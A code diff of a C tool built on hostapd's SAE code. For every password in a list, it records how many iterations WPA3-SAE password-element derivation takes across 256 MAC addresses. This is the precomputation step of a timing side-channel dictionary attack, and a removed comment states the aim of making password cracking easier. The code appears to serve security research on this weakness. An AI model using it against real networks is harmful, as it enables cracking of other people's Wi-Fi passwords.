@@ -17,78 +17,6 @@ u8 prime24[256] = {
     56, 119, 250, 215, 239, 9, 202, 219, 9, 74, 233, 30, 26, 21, 151
 };
 
-// Version of sae_derive_pwe_ffc with a little less code to save time and hopefully make password cracking easier, output is the same.
-static u8 sae_derive_pwe_ffc_test(struct sae_data *sae, const u8 *addr1,
-			      const u8 *addr2, const u8 *password,
-			      size_t password_len) {
-	u8 counter;
-	u8 addrs[2 * ETH_ALEN];
-	const u8 *addr[2];
-	size_t len[2];
-	u8 found = 0;
-	struct crypto_bignum *pwe;
-	size_t prime_len = sae->tmp->prime_len * 8;
-	u8 *pwe_buf;
-
-	crypto_bignum_deinit(sae->tmp->pwe_ffc, 1);
-	sae->tmp->pwe_ffc = NULL;
-
-	/* Allocate a buffer to maintain selected and candidate PWE for constant
-	 * time selection. */
-	pwe_buf = os_zalloc(prime_len * 2);
-	pwe = crypto_bignum_init();
-	if (!pwe_buf || !pwe)
-		goto fail;
-
-	wpa_hexdump_ascii_key(MSG_DEBUG, "SAE: password",
-			      password, password_len);
-
-	sae_pwd_seed_key(addr1, addr2, addrs);
-
-	addr[0] = password;
-	len[0] = password_len;
-	addr[1] = &counter;
-	len[1] = sizeof(counter);
-
-	for (counter = 1; !found; counter++) {
-		u8 pwd_seed[SHA256_MAC_LEN];
-
-		if (counter > 200) {
-			/* This should not happen in practice */
-			wpa_printf(MSG_DEBUG, "SAE: Failed to derive PWE");
-			break;
-		}
-
-		wpa_printf(MSG_DEBUG, "SAE: counter = %02u", counter);
-		if (hmac_sha256_vector(addrs, sizeof(addrs), 2,
-				       addr, len, pwd_seed) < 0)
-			break;
-		found = (u8)sae_test_pwd_seed_ffc(sae, pwd_seed, pwe);
-		/* res is -1 for fatal failure, 0 if a valid PWE was not found,
-		 * or 1 if a valid PWE was found. */
-		if ((int)found < 0)
-			break;
-		/* Store the candidate PWE into the second half of pwe_buf and
-		 * the selected PWE in the beginning of pwe_buf using constant
-		 * time selection. */
-		if (crypto_bignum_to_bin(pwe, pwe_buf + prime_len, prime_len,
-					 prime_len) < 0)
-			break;
-		const_time_select_bin(found, pwe_buf, pwe_buf + prime_len,
-				      prime_len, pwe_buf);
-	}
-
-	if (!found)
-		goto fail;
-
-	wpa_printf(MSG_DEBUG, "SAE: Use PWE from counter = %02u", counter);
-	sae->tmp->pwe_ffc = crypto_bignum_init_set(pwe_buf, prime_len);
-fail:
-	crypto_bignum_deinit(pwe, 1);
-	bin_clear_free(pwe_buf, prime_len * 2);
-	return counter-1;
-}
-
 int main(int argc, char *argv[]) {
     if (argc != 3) {
         exit(1);
@@ -118,6 +46,12 @@ int main(int argc, char *argv[]) {
     if (pas_fd != NULL) {
         char line[256];
 
+        int line_count = 0;
+        for (int c = getc(pas_fd); c != EOF; c = getc(pas_fd)) if (c == '\n') line_count = line_count + 1;
+        fseek(pas_fd, 0, SEEK_SET);
+        printf("Total passwords requested: %d\n", line_count);
+
+        int i = 0;
         while (fgets(line, sizeof(line), pas_fd)) {
             const int address_num = 256;
             line[os_strlen(line) - 1] = '\0';
@@ -125,13 +59,18 @@ int main(int argc, char *argv[]) {
 
             for (int j = 0; j < address_num; j++) {
                 addr2[5] = j;
-                const int iters = sae_derive_pwe_ffc_test(my_sae, addr1, addr2, (u8 *) line, os_strlen(line));
+                const int iters = sae_derive_pwe_ffc(my_sae, addr1, addr2, (u8 *) line, os_strlen(line));
                 fprintf(out_fd, " %u", iters);
                 if (j < address_num - 1) fprintf(out_fd, ",");
             }
 
             fprintf(out_fd, "\n");
+
+            printf("Finished %d out of %d passwords\r", ++i, line_count);
+            fflush(stdout);
         }
+
+        printf("Finished %d out of %d passwords\n", line_count, line_count);
 
         fclose(pas_fd);
     } else {
